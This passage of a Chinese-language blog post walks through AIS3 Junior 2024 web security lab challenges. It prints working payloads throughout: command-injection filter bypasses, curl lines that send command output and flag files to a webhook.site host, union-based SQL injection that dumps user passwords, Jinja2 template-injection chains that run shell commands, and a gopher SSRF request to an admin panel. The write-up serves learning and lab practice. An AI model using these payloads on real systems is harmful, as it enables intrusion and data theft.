+<li><p>做最簡單的cmd injection<br> <img src="https://hackmd.io/_uploads/Skz5vKRc0.png" alt="image"><br> <img src="https://hackmd.io/_uploads/SJgjwY05A.png" alt="image"><br> RCE !<br> <img src="https://hackmd.io/_uploads/HJByuFR90.png" alt="image"></p>
+<p> <img src="https://hackmd.io/_uploads/rknavY05A.png" alt="image"></p>
+</li>
+</ol>
+</li>
+<li>CMD02<ol>
+<li>嘗試跟上一題一樣的<br> <img src="https://hackmd.io/_uploads/rks05F05R.png" alt="image"><br> <img src="https://hackmd.io/_uploads/HkUgotR9C.png" alt="image"><br> 單獨測試空格、分號、ls &#x3D;&gt; 會過濾 ls</li>
+<li>bypass 特定指令<br> 在指令中間塞 \ 仍可執行<br> <img src="https://hackmd.io/_uploads/HyPHstC50.png" alt="image"><br> <img src="https://hackmd.io/_uploads/HJc_stC5C.png" alt="image"><br> RCE !<br> <img src="https://hackmd.io/_uploads/ByhknYAq0.png" alt="image"><br> <img src="https://hackmd.io/_uploads/rJvgnFRq0.png" alt="image"></li>
+</ol>
+</li>
+<li>CMD03<ol>
+<li>嘗試<br> <img src="https://hackmd.io/_uploads/Hk81pYA9C.png" alt="image"><br> <img src="https://hackmd.io/_uploads/rkxTZaYRcC.png" alt="image"><br> 單獨測試空格、分號、ls &#x3D;&gt; 會過濾空格、分號</li>
+<li>bypass 分號<br> 利用 “$()”<br> <img src="https://hackmd.io/_uploads/B1M-RFC5A.png" alt="image"><br> <img src="https://hackmd.io/_uploads/HJfGRYAq0.png" alt="image"><br> RCE !</li>
+<li>bypass 空格<br> 用 ${IFS} 代替空格<br> <img src="https://hackmd.io/_uploads/HyGK0tR5A.png" alt="image"><br> <img src="https://hackmd.io/_uploads/rka5RFC9R.png" alt="image"></li>
+</ol>
+</li>
+<li>CMD04<ol>
+<li>測試正常輸入<br> <img src="https://hackmd.io/_uploads/rJWiJcR9R.png" alt="image"><br> <img src="https://hackmd.io/_uploads/HyQnyqC50.png" alt="image"><br> 只會回傳有沒有執行成功 &#x3D;&gt; 試圖將執行結果往外傳</li>
+<li>測試黑名單<br> 單獨測試空格、分號、ls、$、雙引號<br> &#x3D;&gt; 過濾空格、分號、ls</li>
+<li>開 webhook.site 準備接收封包<br> <img src="https://hackmd.io/_uploads/Byv_-qC50.png" alt="image"></li>
+<li>利用 curl 將結果送到 webkook ，並bypass 分號、空格<br> <img src="https://hackmd.io/_uploads/HJR2mqC90.png" alt="image"> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.8.8.8<span class="string">&quot;<span class="subst">$(cu\rl$&#123;IFS&#125;https://webhook.site/d53be48c-03c9-4b61-bb18-63d3ce9afffd$&#123;IFS&#125;--data$&#123;IFS&#125;<span class="string">&quot;<span class="subst">$(l\s)</span>&quot;</span>)</span>&quot;</span></span><br></pre></td></tr></table></figure>
+ <img src="https://hackmd.io/_uploads/BJSC7cR9C.png" alt="image"><br> <img src="https://hackmd.io/_uploads/Bytg45R5R.png" alt="image"><br> <img src="https://hackmd.io/_uploads/H1s44q05A.png" alt="image"><br> RCE !</li>
+<li>取得flag <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.8.8.8<span class="string">&quot;<span class="subst">$(cu\rl$&#123;IFS&#125;https://webhook.site/d53be48c-03c9-4b61-bb18-63d3ce9afffd$&#123;IFS&#125;--data$&#123;IFS&#125;<span class="string">&quot;<span class="subst">$(c\at$&#123;IFS&#125;ERRORCMDi_FLAG)</span>&quot;</span>)</span>&quot;</span></span><br></pre></td></tr></table></figure>
+ <img src="https://hackmd.io/_uploads/ryknV9C90.png" alt="image"></li>
+</ol>
+</li>
+<li>CMD05<ol>
+<li>用上一題payload試<br> <img src="https://hackmd.io/_uploads/SkjrBqC9C.png" alt="image"> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.8.8.8<span class="string">&quot;<span class="subst">$(cu\rl$&#123;IFS&#125;https://webhook.site/d53be48c-03c9-4b61-bb18-63d3ce9afffd$&#123;IFS&#125;--data$&#123;IFS&#125;<span class="string">&quot;<span class="subst">$(l\s)</span>&quot;</span>)</span>&quot;</span></span><br></pre></td></tr></table></figure>
+ <img src="https://hackmd.io/_uploads/BJvwHjRcA.png" alt="image"><br> RCE !</li>
+<li>取得flag <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.8.8.8<span class="string">&quot;<span class="subst">$(cu\rl$&#123;IFS&#125;https://webhook.site/d53be48c-03c9-4b61-bb18-63d3ce9afffd$&#123;IFS&#125;--data$&#123;IFS&#125;<span class="string">&quot;<span class="subst">$(c\at$&#123;IFS&#125;BLindCMDiFLAG)</span>&quot;</span>)</span>&quot;</span></span><br></pre></td></tr></table></figure>
+ <img src="https://hackmd.io/_uploads/rJ9k8iRcC.png" alt="image"></li>
+</ol>
+</li>
+<li>[Bonus] CMD06<ol>
+<li>檢查黑名單<br> 單獨輸入空白、$()、``、””、ls<br> &#x3D;&gt; 過濾 空白、””、ls</li>
+<li>bypass “”<br> 嘗試用``代替”$()”發現好像只能輸出一行<br> <img src="https://hackmd.io/_uploads/r1lTdiA50.png" alt="image"><br> <img src="https://hackmd.io/_uploads/HypTdo09A.png" alt="image"><br> 輸出一行那輸出flag好像也夠了?flag的檔名先猜個 F*<br> <img src="https://hackmd.io/_uploads/SJyuusCq0.png" alt="image"><br> <img src="https://hackmd.io/_uploads/HJ4bYjCq0.png" alt="image"></li>
+</ol>
+</li>
+</ul>
+<h3 id="06-SQL-Injection"><a href="#06-SQL-Injection" class="headerlink" title="06 - SQL Injection"></a>06 - SQL Injection</h3><ul>
+<li>SQL01<ol>
+<li>帳號填 admin’ or 1&#x3D;1 的變化多試幾個，密碼隨意填</li>
+<li>試出來了<br> <img src="https://hackmd.io/_uploads/SyqKjiAc0.png" alt="image"><br> <img src="https://hackmd.io/_uploads/BkvqijC9R.png" alt="image"></li>
+</ol>
+</li>
+<li>SQL02<br>  <del>對 因為要當好駭客 不當腳本小子 我要來手戳</del><ol>
+<li>確定可以SQLi<br> <img src="https://hackmd.io/_uploads/S1oT2i0qA.png" alt="image"><br> <img src="https://hackmd.io/_uploads/H1CR2o0qR.png" alt="image"></li>
+<li>union base<br> <img src="https://hackmd.io/_uploads/BJqrpoRcA.png" alt="image"> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select schema_name from `information_schema`.`schemata` -- -</span><br></pre></td></tr></table></figure>
+ <img src="https://hackmd.io/_uploads/BkrK6oRq0.png" alt="image"></li>
+<li>試幾個欄位 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select 1, schema_name from `information_schema`.`schemata` -- -</span><br><span class="line">1222 (21000): The used SELECT statements have a different number of columns</span><br><span class="line">a&#x27; union select 1, 2, schema_name from `information_schema`.`schemata` -- -</span><br><span class="line">1222 (21000): The used SELECT statements have a different number of columns</span><br></pre></td></tr></table></figure></li>
+<li>取得 DB name<br> <img src="https://hackmd.io/_uploads/SJ8TRiAc0.png" alt="image"> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select 1, 2, 3, schema_name from `information_schema`.`schemata` -- -</span><br></pre></td></tr></table></figure>
+ <img src="https://hackmd.io/_uploads/SJiEJhA9R.png" alt="image"><br> 應該在 ApexPredators DB 找ApexPredators DataCenter Portal 的管理者帳密</li>
+<li>取得table name <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select 1, 2, 3, table_name from `information_schema`.`tables`  where table_schema=&#x27;ApexPredators&#x27; -- -</span><br></pre></td></tr></table></figure>
+ <img src="https://hackmd.io/_uploads/rkhOlnRcC.png" alt="image"></li>
+<li>取得 column name <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select 1, 2, 3, column_name from `information_schema`.`columns`  where table_name=&#x27;users&#x27; -- -</span><br></pre></td></tr></table></figure>
+ <img src="https://hackmd.io/_uploads/rkdy-2Aq0.png" alt="image"></li>
+<li>取得 data <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; union select 1, username, password, isAdmin from `ApexPredators`.`users`   -- -</span><br></pre></td></tr></table></figure>
+ <img src="https://hackmd.io/_uploads/SkE5Zh090.png" alt="image"><br> 找到admin</li>
+<li>登入admin<br> <img src="https://hackmd.io/_uploads/HykRZnR5R.png" alt="image"><br> <img src="https://hackmd.io/_uploads/S1KAWnRcA.png" alt="image"></li>
+</ol>
+</li>
+<li>SQL03<ol>
+<li>嘗試黑名單 &#x3D;&gt; 過濾 空格、– -</li>
+<li>bypass 空格 &#x3D;&gt; 空格一律用&#x2F;**&#x2F;代替</li>
+<li>bypass – - &#x3D;&gt; 註解用 # 代替</li>
+<li>跟上題一樣登入步驟 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;/**/union/**/select/**/1,/**/2,/**/3,/**/schema_name/**/from/**/`information_schema`.`schemata`/**/#</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;/**/union/**/select/**/1,/**/2,/**/3,/**/table_name/**/from/**/`information_schema`.`tables`/**/where/**/table_schema=&#x27;ApexPredators&#x27;/**/#</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;/**/union/**/select/**/1,/**/2,/**/3,/**/column_name/**/from/**/`information_schema`.`columns`/**/where/**/table_name=&#x27;users&#x27;/**/#</span><br></pre></td></tr></table></figure>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;/**/union/**/select/**/1,/**/username,/**/password,/**/isAdmin/**/from/**/`ApexPredators`.`users`/**/#</span><br></pre></td></tr></table></figure>
+ <img src="https://hackmd.io/_uploads/B1hXNnC9C.png" alt="image"></li>
+<li>登入admin<br> <img src="https://hackmd.io/_uploads/SJGqVnA9R.png" alt="image"></li>
+</ol>
+</li>
+</ul>
+<h3 id="07-Server-Side-Template-Injection"><a href="#07-Server-Side-Template-Injection" class="headerlink" title="07 - Server-Side Template Injection"></a>07 - Server-Side Template Injection</h3><ul>
+<li><p>STI01</p>
+<ol>
+<li>確認模板<br> <img src="https://hackmd.io/_uploads/Syn4Hn0qR.png" alt="image"><br> &#x3D;&gt; 可以猜 Jinja2 (Python)</li>
+<li>用hacktricks的payload <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; cycler.__init__.__globals__.os.popen(&#x27;id&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+ <img src="https://hackmd.io/_uploads/SkyCrnC9A.png" alt="image"><br> <img src="https://hackmd.io/_uploads/By7M8hR9C.png" alt="image"><br> RCE !<br> <img src="https://hackmd.io/_uploads/BJx38nC90.png" alt="image"></li>
+</ol>
+</li>
+<li><p>STI02</p>
+<ol>
+<li><p>嘗試貼上題的payload</p>
+</li>
+<li><p>RCE !<br>  <img src="https://hackmd.io/_uploads/HJe8DhCcA.png" alt="image"></p>
+</li>
+<li><p>取得flag<br> <img src="https://hackmd.io/_uploads/H1-S8nA9A.png" alt="image"></p>
+</li>
+</ol>
+</li>
+<li><p>STI03</p>
+<ol>
+<li>檢查黑名單 &#x3D;&gt; 過濾 <code>&#123;&#123; &#125;&#125;</code>、<code>[]</code></li>
+<li>用hacktricks的payload <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%with a=request|attr(&quot;application&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fbuiltins\x5f\x5f&quot;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fimport\x5f\x5f&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;ls&#x27;)|attr(&#x27;read&#x27;)()%&#125;&#123;%print(a)%&#125;&#123;%endwith%&#125;</span><br></pre></td></tr></table></figure>
+ <img src="https://hackmd.io/_uploads/BkdO70C50.png" alt="image"><br> RCE ! <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%with a=request|attr(&quot;application&quot;)|attr(&quot;\x5f\x5fglobals\x5f\x5f&quot;)|attr(&quot;\x5f\x5fgetitem\x5f\x5f&quot;)(&quot;\x5f\x5fbuiltins\x5f\x5f&quot;)|attr(&#x27;\x5f\x5fgetitem\x5f\x5f&#x27;)(&#x27;\x5f\x5fimport\x5f\x5f&#x27;)(&#x27;os&#x27;)|attr(&#x27;popen&#x27;)(&#x27;cat FLAG&#x27;)|attr(&#x27;read&#x27;)()%&#125;&#123;%print(a)%&#125;&#123;%endwith%&#125;</span><br></pre></td></tr></table></figure>
+ <img src="https://hackmd.io/_uploads/BJbbBA0qC.png" alt="image"></li>
+</ol>
+</li>
+</ul>
+<h3 id="08-Server-Side-Request-Forgery"><a href="#08-Server-Side-Request-Forgery" class="headerlink" title="08 - Server-Side Request Forgery"></a>08 - Server-Side Request Forgery</h3><ul>
+<li>SRF01<ol>
+<li>用 file:&#x2F;&#x2F; 讀取 &#x2F;app&#x2F;FLAG<br> <img src="https://hackmd.io/_uploads/SkpJy1Ji0.png" alt="image"></li>
+<li>看圖片原始碼<br> <img src="https://hackmd.io/_uploads/SyWHykysR.png" alt="image"></li>
+<li>base64 decode<br> <img src="https://hackmd.io/_uploads/HkfvJy1j0.png" alt="image"></li>
+</ol>
+</li>
+<li>SRF02<ol>
+<li>注意到 ADMIN PANEL 在 &#x2F;local</li>
+<li>嘗試最基本payload<br> <img src="https://hackmd.io/_uploads/SkcXaAR9A.png" alt="image"><br> <img src="https://hackmd.io/_uploads/r1fnaRRc0.png" alt="image"></li>
+<li>base64 decode<br> <img src="https://hackmd.io/_uploads/SJz1CA05A.png" alt="image"></li>
+</ol>
+</li>
+<li>SRF03<ol>
+<li>測試黑名單 &#x3D;&gt; 過濾 localhost、127.0.0.1</li>
+<li>bypass<br> 將127.0.0.1轉成十六進制<br> <img src="https://hackmd.io/_uploads/rJHngJ1iA.png" alt="image"><br> <img src="https://hackmd.io/_uploads/SkWyZ11oC.png" alt="image"></li>
+<li>base64 decode<br> <img src="https://hackmd.io/_uploads/S1YbZyJoR.png" alt="image"></li>
+</ol>
+</li>
+<li>SRF04<ol>
+<li>測試黑名單 &#x3D;&gt; localhost、127.0.0.1<ul>
+<li>bypass &#x3D;&gt; gopher:&#x2F;&#x2F;0</li>
+</ul>
+</li>
+<li>製作gopher POST封包 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gopher://0:80_</span><br><span class="line">POST%20/local%20HTTP/1.1%0D%0A</span><br><span class="line">Host:%20127.0.0.1%0D%0A</span><br><span class="line">Content-Type:%20application/x-www-form-urlencoded%0d%0A</span><br><span class="line">Content-Length:%2032%0d%0A</span><br><span class="line">%0D%0A</span><br><span class="line">username=admin&amp;password=password</span><br></pre></td></tr></table></figure>
+ &#x3D;&gt; <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://0:80/_POST%20/local%20HTTP/1.1%0D%0AHost:127.0.0.1%0D%0AContent-Type:%20application/x-www-form-urlencoded%0d%0AContent-Length:%2032%0d%0A%0D%0Ausername=admin&amp;password=password</span><br></pre></td></tr></table></figure></li>
+<li>送出封包<br> <img src="https://hackmd.io/_uploads/Hk5-Xy1s0.png" alt="image"><br> <img src="https://hackmd.io/_uploads/Syd7mkJj0.png" alt="image"><br> <img src="https://hackmd.io/_uploads/BkuSQkysR.png" alt="image"></li>
+</ol>
+</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tag/">Tag</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#01-Broken-Access-Control"><span class="toc-number">1.</span> <span class="toc-text">01 - Broken Access Control</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#02-File-Upload"><span class="toc-number">2.</span> <span class="toc-text">02 - File Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#03-Local-File-Inclusion"><span class="toc-number">3.</span> <span class="toc-text">03 - Local File Inclusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#04-Cross-Site-Scripting"><span class="toc-number">4.</span> <span class="toc-text">04 - Cross-Site Scripting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#05-Command-Injection"><span class="toc-number">5.</span> <span class="toc-text">05 - Command Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#06-SQL-Injection"><span class="toc-number">6.</span> <span class="toc-text">06 - SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#07-Server-Side-Template-Injection"><span class="toc-number">7.</span> <span class="toc-text">07 - Server-Side Template Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#08-Server-Side-Request-Forgery"><span class="toc-number">8.</span> <span class="toc-text">08 - Server-Side Request Forgery</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&text=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&title=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&is_video=false&description=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AIS3 Junior 2024 - Web Security Walkthrough&body=Check out this article: http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&title=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&title=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&title=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&title=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&name=AIS3 Junior 2024 - Web Security Walkthrough&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/18/AIS3-Junior-2024-Web-Security-Walkthrough/&t=AIS3 Junior 2024 - Web Security Walkthrough"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    wang
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
